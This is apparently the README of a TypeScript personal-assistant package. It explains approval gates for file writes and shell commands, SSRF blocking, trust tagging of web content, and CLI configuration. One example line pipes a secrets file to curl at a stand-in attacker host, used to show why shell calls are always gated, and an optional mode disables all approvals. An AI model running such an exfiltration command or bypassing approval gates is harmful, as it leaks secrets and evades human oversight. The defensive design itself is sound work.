# @buildaharness/personal-assistant

A general-purpose, everyday-use chat assistant that runs on the full 11-layer
harness (`@buildaharness/harness`) every turn — light enough for "what's the
weather" and consequential enough to gate "send that email" behind approval.

## Design

Where a heavy autonomous agent decomposes an objective into a multi-task plan,
this assistant treats every chat message as **one objective, one task**. That
keeps `HarnessRuntime.run()` cheap per turn (no LLM calls inside the harness
loop itself — it's synchronous state-machine bookkeeping) while still walking
every layer: World Model, Evidence, Hypothesis, Control State, Planning
(trivial one-task graph), Execution, Verification, Recovery path, Memory
(context compression), Learning (`ExperienceStore`), and the Reviewer Pass +
output validation at the end.

Three things live *outside* a single harness run, deliberately:

- **Conversation history** — each turn's `WorldModel`/`TaskGraph`/etc. are
  scratch state for that turn only, the same way they are for any harness run.
  The transcript is kept in a `MemoryAdapter` (in-memory by default; swap in
  `IndexedDBAdapter` from `@buildaharness/runtime` for browser persistence) and
  fed to the LLM call directly.
- **Risk classification** — `risk-classifier.ts` is a cheap keyword heuristic
  that flags consequential requests (send/delete/pay/post/...) *before* the
  harness — and before the one real network call — ever runs. A `HIGH` risk
  turn returns `status: 'needs_approval'` with zero LLM calls spent; call
  `turn(message, { approved: true })` to proceed after the caller confirms.
- **Learning across turns** — `ExperienceStore` (strategy weights, learned
  decompositions, recovery sequences) is in-memory by default; swap in
  `DexieExperienceStore` from `@buildaharness/runtime` so it survives a page
  reload.

### Checkpointing and resume

`HarnessRuntime.run()`/`.resume()` are async and can suspend mid-loop, yielding
a serializable `HarnessCheckpoint` after each iteration that makes task
progress. `PersonalAssistant` uses this to survive a crash or reload *during*
a turn, not just between them: every turn writes its checkpoint to a
`checkpointStore` (in-memory by default; swap in `IndexedDBAdapter` for
persistence) keyed by `turn:<sessionId>`, and deletes it once the turn
finishes (normally or via escalation). If `turn()` is called again for a
session that still has a leftover checkpoint — because the previous call never
reached that cleanup — it resumes the interrupted harness run instead of
silently starting over.

Net effect: one real LLM call per ordinary turn, zero for a blocked one, and
every layer of the harness touched on the ones that do run — matching what
[buildaharness.com/harness-comparison](https://buildaharness.com/harness-comparison)
calls out as missing from Hermes Agent, Kilo Code, and OpenClaw: none of them
ships a formal Control State resolver *and* a Reviewer/output gate together.

## Usage

```ts
import { LLMClient } from '@buildaharness/runtime'
import { PersonalAssistant } from '@buildaharness/personal-assistant'

const assistant = new PersonalAssistant({
  llmClient: new LLMClient({ proxyUrl, authToken }),
})

const result = await assistant.turn('What time zone is Tokyo in?')
// { status: 'ok', reply: '...', riskLevel: 'LOW', controlState: {...}, stepsUsed: 1 }

const gated = await assistant.turn('Send an email to my boss saying I quit.')
// { status: 'needs_approval', reason: '...', riskLevel: 'HIGH' } — no LLM call made

await assistant.turn('Send an email to my boss saying I quit.', { approved: true })
// proceeds and runs the harness normally
```

In a browser, use `PersonalAssistant.create()` instead of `new PersonalAssistant()`
to default transcript, learning, and checkpoint storage to their IndexedDB/Dexie-backed
implementations, so all three survive a page reload:

```ts
const assistant = await PersonalAssistant.create({
  llmClient: new LLMClient({ proxyUrl, authToken }),
})
```

`create()` only supplies a default for storage the caller didn't already pass
in — outside a browser it falls back to the same in-memory defaults as the
plain constructor *unless* the caller passes its own `memory`/`experienceStore`/
`checkpointStore`, which is exactly what the CLI and the Tauri desktop app do
(see "Front ends" below) to get real persistence without either of them
needing a browser.

## Front ends

Three front ends share this one package and harness underneath — none is more
"real" than the others, and each picks the storage backend that fits where it
runs:

| Front end | Where | Storage |
|---|---|---|
| This package's `PersonalAssistant` class | Any Node/browser code | In-memory by default; bring your own `MemoryAdapter`/`ExperienceStore` |
| CLI (`cli.ts`, below) | Terminal | `FileSystemAdapter`/`FileSystemExperienceStore` (`@buildaharness/runtime`) over `node:fs/promises`, under `~/.buildaharness/personal-assistant/` |
| `@buildaharness/chat-ui` | Browser | `IndexedDBAdapter`/`DexieExperienceStore` via `PersonalAssistant.create()` (best-effort — see `packages/runtime/README.md`'s persistence section) |
| `@buildaharness/desktop` | Native window (Tauri, wraps chat-ui) | Same `FileSystemAdapter`/`FileSystemExperienceStore` classes as the CLI, but over `@tauri-apps/plugin-fs` instead of `node:fs`, under `appLocalDataDir()` |

Both filesystem backends are the *same* `FileSystemAdapter`/`FileSystemExperienceStore`
classes — see `packages/runtime/README.md`'s "Filesystem-backed storage"
section for how the file-I/O seam that makes that possible works.

The REPL commands below (`/clear`, `/export`, `/undo`, `/memory`, `/cost`,
`/doctor`) have GUI equivalents in chat-ui/desktop too — a header button for
each action, and a Settings > Diagnostics section for the read-only ones —
reusing this package's `formatMemorySummary`/`formatCostSummary`/`formatDoctorReport`/
`formatTranscriptMarkdown`/`estimateCostUsd` exports so both front ends render
identical data, never two descriptions of the same facts. See
`packages/chat-ui/README.md`'s "Session actions & Diagnostics" section.

## File access via tools

`PersonalAssistant` can give the model real `read_file`/`list_directory`/`write_file`
tools, scoped to a single sandboxed workspace directory, by passing a `fileTools`
option:

```ts
const assistant = new PersonalAssistant({
  llmClient,
  fileTools: { backend, workspaceRoot: '/path/to/workspace' }, // any FsBackend — node:fs/promises, @tauri-apps/plugin-fs, etc.
})
```

Absent by default — without it, `turn()` behaves exactly as before this option
existed (a single plain chat call, no tools).

Every path a tool call requests is resolved and validated against `workspaceRoot`
before any I/O: `../` traversal, an absolute path outside the root, and a symlink
*inside* the root that points outside it are all rejected (see `file-tools.ts`'s
`resolveInWorkspace`/`assertRealPathInWorkspace`). A rejected or errored tool call
is reported back to the model as a clear decline, never a silent no-op dressed up
as success.

**`write_file` never executes inline.** It always stages a proposal — `{ kind:
'write', path, content, stagedAt }` — as JSON under
`<workspaceRoot>/.pending-actions/<id>.json`, and the turn returns
`status: 'needs_approval'` with a `pendingActionId` (and `pendingActionKind:
'write'`), the same shape `needs_approval` already has for a HIGH-risk message,
just triggered by the tool call itself rather than a regex over the user's
words (a request like "organize my notes into a summary file" doesn't trip the
message-level risk gate, yet it performs a real write once the model decides to
call `write_file`). Resume it by ID rather than re-asking the model:

```ts
const staged = await assistant.turn('Summarize this into notes.md')
// { status: 'needs_approval', reason: '...', pendingActionId: '...', pendingActionKind: 'write' }

await assistant.turn('Summarize this into notes.md', { approved: true, pendingActionId: staged.pendingActionId })
// applies the exact staged content directly via FsBackend — no second LLM call
// { status: 'ok', reply: 'Wrote "notes.md".' }
```

Declining (`{ approved: false, pendingActionId }`) discards the staged record
without writing. A pending action left over from a crashed/abandoned turn sits
in `.pending-actions/` indefinitely — harmless (never applied without an explicit
`approved: true` with the matching ID) but not currently auto-swept. This same
staging record shape (a `kind` discriminator) is shared with `run_shell_command`
— see "Shell access via tools" below.

Both backends enforce the same "never write inline" rule, by different
mechanisms:

- **Proxy/Anthropic backend** (`LLMClient`): `PersonalAssistant`'s tool loop
  (capped at 5 iterations) calls `callChatStructured` directly, executes
  non-mutating tool calls for real, and intercepts `write_file` itself before
  it ever reaches `file-tools.ts`'s staging code.
- **Claude CLI backend** (`ClaudeCliLLMClient`): Claude Code's own agentic loop
  calls a `file-tools` MCP server (`file-tools-mcp-server.mjs`) autonomously
  within a single `claude -p` invocation — there's no outer TS loop to
  intercept each call, so the gate lives inside the MCP server's `write_file`
  handler instead, which stages exactly the same `.pending-actions/<id>.json`
  record. `ClaudeCliLLMClient` still always passes `--tools ""` (Claude Code's
  own built-in Read/Write/Bash stay off) and adds `--mcp-config`,
  `--strict-mcp-config` (ignore any ambient project `.mcp.json`), and
  `--dangerously-skip-permissions` (headless `-p` mode has no way to answer an
  interactive tool-permission prompt) only when `fileTools` or `shellTools` is
  configured.

v1 is deliberately read/list/write only — no delete/move tool (higher
consequence than a write, no "undo" via re-approval). One workspace root per
assistant instance; no multi-root or per-request override. chat-ui doesn't have
a write-approval UI yet — file tools are CLI/desktop-only for now.

## Web access via tools

`web_search`/`fetch_url` are read-only — same trust tier as `read_file`/
`list_directory` — so both execute for real immediately, with **no approval
step**, via a `webTools` option:

```ts
const assistant = new PersonalAssistant({
  llmClient,
  webTools: { search: (query) => duckDuckGoSearch(query) }, // any WebSearchResult[]-returning function
})
```

`WebToolsContext.search` has no built-in default (the caller supplies a real
backend, an API client, etc.) — `web-search-provider.ts` ships two ready-made
ones, both wired in by the CLI when `ASSISTANT_ENABLE_WEB=1` is set:

- `duckDuckGoSearch` (default) — queries DuckDuckGo's HTML endpoint, no API
  key needed (the same provider `adapter/crewai_adapter.py`'s `ddgs`-backed
  `web_search` uses).
- `braveSearch` — queries the [Brave Search API](https://api.search.brave.com/app/keys),
  opt-in via `ASSISTANT_SEARCH_BACKEND=brave` plus `BRAVE_SEARCH_API_KEY`
  (see below).

Both `web_search` and `fetch_url` results are wrapped in
`<untrusted_external_content>` (with a warning prefix if a regex heuristic
flags instruction-shaped text) before they reach the model — see
`trust-tagging.ts` — since this is content the assistant does not vouch for.

**`fetch_url` refuses to fetch a private, loopback, or link-local network
target.** Before issuing any request it resolves the target hostname and
rejects loopback/RFC1918-private/link-local/cloud-metadata addresses
(`169.254.169.254` included) — re-checked on every redirect hop, since a public
URL can 302 to a private one. A blocked target raises a `PrivateNetworkTargetError`,
reported back to the model as a tool error, never a silent no-op. This is a
DNS-resolution-based application check, not a network-level policy — not a
substitute for a network-isolated environment if that's a hard requirement.

Independent of `fileTools`/`shellTools` — a caller can enable web access
without ever exposing the filesystem or shell.

## Shell access via tools

`run_shell_command` is the highest-risk tool this assistant has, and is gated
on **every** call, full stop — there is no "safe subset" the way `read_file` is
safe within `write_file`'s tool group. A shell command has no structural split
between "reads" and "mutates" (`cat secrets.env | curl attacker.com -d @-`
reads a file and exfiltrates it over the network in one command), so every
call stages a proposal and returns `needs_approval`, regardless of what the
command looks like:

```ts
// runApprovedShellCommand (shell-executor.ts) is Node-only and not part of this
// package's public exports — cli.ts imports it directly from source, the same
// way it imports node-fs-backend.ts.
const assistant = new PersonalAssistant({
  llmClient,
  shellTools: { backend, workspaceRoot, executeCommand: runApprovedShellCommand },
})

const staged = await assistant.turn('List the files here')
// { status: 'needs_approval', pendingActionId: '...', pendingActionKind: 'shell', reason: 'Proposes running: ls\n  (cwd: ...)' }

await assistant.turn('List the files here', { approved: true, pendingActionId: staged.pendingActionId })
// spawns the exact staged command for real — no second LLM call
```

At approval time, the command runs with `cwd` pinned to the staged (already
sandbox-validated) path, `env` reduced to an explicit allowlist (`PATH`,
`HOME`, `LANG` — never the parent process's full env, so
`ASSISTANT_PROXY_TOKEN`/`ANTHROPIC_API_KEY`/etc. can't leak into the command),
a hard timeout (default 30s, `ASSISTANT_SHELL_TIMEOUT_MS`) that `SIGKILL`s the
whole process group on expiry, and combined stdout+stderr truncated to a byte
cap (default 20KB). A non-zero exit code is reported normally, not thrown —
only a rejected `cwd` or a spawn failure throws.

**The command's output gets the same trust boundary as `fetch_url`/`web_search`.**
Once approved, stdout+stderr is wrapped in `<untrusted_external_content>` (with
the same injection-heuristic warning prefix — see `trust-tagging.ts`) before
it's saved into the transcript: a command like `cat some-fetched-page.html` can
carry the same injection-shaped text a fetched web page can, and that reply
becomes conversation history a later turn could otherwise misread as
instructions.

`executeCommand` is a required, injected function rather than something
`shell-tools.ts` implements itself: `assistant.ts` is bundled into the browser
build (via `index.ts`) as well as the CLI, so it never imports
`node:child_process` directly. The real `child_process.spawn`-based
implementation lives in `shell-executor.ts` (mirrors `node-fs-backend.ts` —
deliberately not exported from this package's index; only `cli.ts` imports it).

On the Claude CLI backend, `run_shell_command` is never a Claude Code built-in:
`ClaudeCliLLMClient` never adds `Bash` to `--tools` under any configuration
(there's a unit test asserting this as a hard invariant) — instead it's served
by the same MCP server as the file tools, gated behind `ENABLE_SHELL_TOOLS=1`,
which only stages (never executes), exactly like `write_file`.

**Known limitations:** no persistent shell session (each approved command runs
in its own fresh subprocess — a `cd` inside one command doesn't affect the
next); no streaming output (only available after the process exits or times
out). Shell access is opt-in and off by default — enabling it is a real trust
decision this plan makes *safe*, not *risk-free*.

## CLI

```bash
ASSISTANT_PROXY_URL=http://localhost:8787 ASSISTANT_PROXY_TOKEN=... npm run cli --workspace=packages/personal-assistant
```

Set `ASSISTANT_WORKSPACE_DIR` to sandbox the file tools to a specific directory
(defaults to the CLI's current working directory, mirroring how `claude` itself
defaults to the launch directory):

```bash
ASSISTANT_WORKSPACE_DIR=/path/to/workspace npm run cli --workspace=packages/personal-assistant
```

When the model calls `write_file`, the CLI prints the proposed path and a
content preview and asks for confirmation before the turn is resumed with
`{ approved, pendingActionId }` — declining discards the staged write; nothing
is ever written without an explicit yes. A `run_shell_command` call is shown
the same way, printing the exact command and resolved `cwd` instead.

Set `ASSISTANT_ENABLE_WEB=1` to give the model real `web_search`/`fetch_url`
tools (no approval needed — see "Web access via tools" above; on the proxy
backend this defaults to `duckDuckGoSearch` as the search implementation) and
`ASSISTANT_ENABLE_SHELL=1` to give it a real, approval-gated
`run_shell_command` tool scoped to `ASSISTANT_WORKSPACE_DIR`. Both are off by
default; `ASSISTANT_ENABLE_SHELL` must be exactly `"1"` (a stray
`ASSISTANT_ENABLE_SHELL=0` left in an env file does not enable it). Optional
`ASSISTANT_SHELL_TIMEOUT_MS` (default 30000) tunes the shell timeout:

```bash
ASSISTANT_ENABLE_WEB=1 ASSISTANT_ENABLE_SHELL=1 npm run cli --workspace=packages/personal-assistant
```

The startup banner only mentions a capability when it's actually enabled —
nothing implies web/shell access is available when neither env var is set.
Note: `ASSISTANT_ENABLE_WEB` only takes effect on the proxy backend for
now — the Claude CLI backend has no web_search wiring yet (see
`claude-cli-llm-client.ts`'s doc comment).

#### `--dangerously-skip-permissions` equivalent

Set `ASSISTANT_DANGEROUSLY_SKIP_PERMISSIONS=1` (or `/config set
dangerouslySkipPermissions true`) to skip *every* approval prompt automatically
— the message-level risk gate (a HIGH-risk message like "send an email...")
and `write_file`/`run_shell_command`'s per-call staging both resolve as if you
had already said yes. Off by default, and named to match Claude Code's own
flag: it is exactly as dangerous as it sounds — a proposed shell command or
file write executes with zero chance to review it first. The underlying
sandboxing (workspace-root path scoping, the shell env allowlist, output
truncation, the timeout) is unaffected; this only skips the ask, never the
limits underneath it. The startup banner switches shell's capability label
from "approval-gated" to "NOT approval-gated" and prints an extra `⚠` line
whenever this is on, so it's never silently in effect.

#### Using Brave Search instead of DuckDuckGo

By default, `ASSISTANT_ENABLE_WEB=1` uses the free, keyless `duckDuckGoSearch`
provider. To use the [Brave Search API](https://api.search.brave.com/app/keys)
instead, opt in explicitly with `ASSISTANT_SEARCH_BACKEND=brave` and supply
`BRAVE_SEARCH_API_KEY`:

```bash
ASSISTANT_ENABLE_WEB=1 ASSISTANT_SEARCH_BACKEND=brave BRAVE_SEARCH_API_KEY=your-key \
  npm run cli --workspace=packages/personal-assistant
```

`ASSISTANT_SEARCH_BACKEND` must be exactly `"brave"` to switch providers —
any other value (or leaving it unset) keeps the DuckDuckGo default. If
`ASSISTANT_SEARCH_BACKEND=brave` is set without `BRAVE_SEARCH_API_KEY`, the
CLI fails fast at startup with an error rather than silently falling back to
DuckDuckGo, since a missing key there is almost always a misconfiguration.
The active backend is shown in the startup banner (e.g. `web search/fetch
(brave)`). Both `searchBackend` and `braveApiKey` can also be set from inside
a running session with `/config set` instead of an env var — see
"Configuration" below.

Set `ASSISTANT_LLM_BACKEND=claude-cli` to skip the proxy entirely and run turns
through a local `claude -p` subprocess instead, using your already-authenticated
Claude Code CLI session rather than an API key (`CLAUDE_PATH` overrides the
`claude` binary path if it's not on `PATH`):

```bash
ASSISTANT_LLM_BACKEND=claude-cli npm run cli --workspace=packages/personal-assistant
```

Transcript, learned experience, reminders, and any in-flight turn's checkpoint
persist as real files under `~/.buildaharness/personal-assistant/`
(`transcripts/`, `experience/`, `reminders/`, `checkpoints/`), so conversation
history and learning survive between runs — quit and restart the CLI and it
remembers.

## Configuration

Every env var documented above (`ASSISTANT_ENABLE_WEB`, `ASSISTANT_SEARCH_BACKEND`,
`BRAVE_SEARCH_API_KEY`, `ASSISTANT_ENABLE_SHELL`, `ASSISTANT_SHELL_TIMEOUT_MS`,
`ASSISTANT_DANGEROUSLY_SKIP_PERMISSIONS`, `ASSISTANT_LLM_BACKEND`,
`ASSISTANT_PROXY_URL`, `ASSISTANT_PROXY_TOKEN`,
`ASSISTANT_MODEL`, `ASSISTANT_WORKSPACE_DIR`) keeps working exactly as
described — nothing here is a breaking change. What's new is a persisted
settings layer *beneath* those env vars, editable from inside a running CLI
session with `/config`, so a setting survives across runs without needing an
env var set every time:

```
you> /config
  llmBackend     proxy
  proxyUrl       http://localhost:8787
  authToken      (not set)
  model          (not set)
  enableWeb      true    (env-pinned: ASSISTANT_ENABLE_WEB)
  searchBackend  ddg
  braveApiKey    (not set)
  enableShell    false
  shellTimeoutMs (not set)
  workspaceRoot  (not set)
  dangerouslySkipPermissions false

you> /config set searchBackend brave
✗ searchBackend "brave" requires braveApiKey to be set.

you> /config set braveApiKey sk-...
✓ braveApiKey updated (took effect immediately, no restart needed)

you> /config set searchBackend brave
✓ searchBackend updated (took effect immediately, no restart needed)

you> /config reset searchBackend
✓ Reset searchBackend to default
```

- `/config` lists every field's current (resolved) value. A field currently
  pinned by an env var shows `(env-pinned: VAR_NAME)` and cannot be changed
  with `/config set` — unset the env var first.
- `/config set <key> <value>` validates the change (e.g. `searchBackend brave`
  is rejected without a `braveApiKey` already set) before persisting it, then
  rebuilds the running assistant so the change applies to the very next turn —
  no restart needed.
- `/config reset [key]` clears one persisted key (or, with no key, every
  persisted key), reverting to the env var if still set, or the built-in
  default otherwise.

**Precedence**: env var > persisted config > built-in default, evaluated
independently per field. Settings persist as plain JSON at
`~/.buildaharness/personal-assistant/config.json` — like the rest of this
package's persistence, it's a real file, not encrypted, so `authToken` and
`braveApiKey` are stored in plaintext there. This is the same trust boundary
the repo's root `.env` already has, not a new one.

## REPL commands

Type `/help` inside a running CLI session for this list. All of them read or
change local session/config state — none of them make an LLM call themselves.

| Command | What it does |
|---|---|
| `/help` | Show this list |
| `/clear` (alias `/new`) | Start a fresh conversation — deletes this session's transcript, extracted facts, and active plan. Leaves learned reminders/experience untouched (those are durable, cross-conversation learning, not conversation-scoped state) |
| `/status` | Show the resolved config (model, backend, workspace, enabled capabilities — same as the startup banner) plus this session's transcript length and whether a plan is active |
| `/export [file]` | Save this session's transcript to a markdown file (default: `assistant-transcript-<timestamp>.md` in the current directory) |
| `/undo` | Remove the last exchange from conversation history — a completed turn drops both the user message and the reply; a turn still awaiting approval drops just the pending message. Only affects what the model remembers: a real `write_file`/`run_shell_command` effect from that turn is **not** reversed |
| `/memory` | Show facts learned about you, reminders created so far, and summary counts from the learning-layer `ExperienceStore` |
| `/model [name]` | Show the active model, or switch it — a thin alias over `/config set model <name>` (see "Configuration" above); rejected the same way if `model` is pinned by `ASSISTANT_MODEL` |
| `/cost` | Show token usage for the last turn and the running session total |
| `/doctor` | Check proxy reachability (proxy backend) or the `claude` binary (claude-cli backend), plus workspace root and data dir health |
| `/why` | Explain the harness path the last turn took (verification confidence + node sequence) |
| `/sources` | List files/URLs the last turn actually consulted |
| `/plan` | Show the active structured plan's task status |

### `/cost` and real vs. estimated dollar figures

Token counts are always real, on both backends. The dollar figure attached to
them is not always the same kind of number:

- **claude-cli backend**: `costUsd` comes straight from `claude
  --output-format json`'s own `total_cost_usd` field — real Anthropic
  accounting. It may read `$0` if the underlying `claude` session is
  authenticated against a Pro/Max subscription rather than API billing, in
  which case `$0` does *not* mean "this turn was free" — `/cost`'s output
  says so explicitly.
- **proxy backend**: `@buildaharness/proxy` is a thin pass-through to
  Anthropic/OpenAI (see `packages/proxy/src/forward.ts`) and never computes a
  cost itself — only the raw token counts each provider's response already
  includes. `/cost` falls back to a small static, hand-maintained pricing
  table (`model-pricing.ts`, Sonnet/Opus/Haiku list prices) to show an
  *approximate* estimate, clearly labeled as such, not real billing data.

## Commands

```bash
npm run build --workspace=packages/personal-assistant
npm test --workspace=packages/personal-assistant
npm run typecheck --workspace=packages/personal-assistant
```
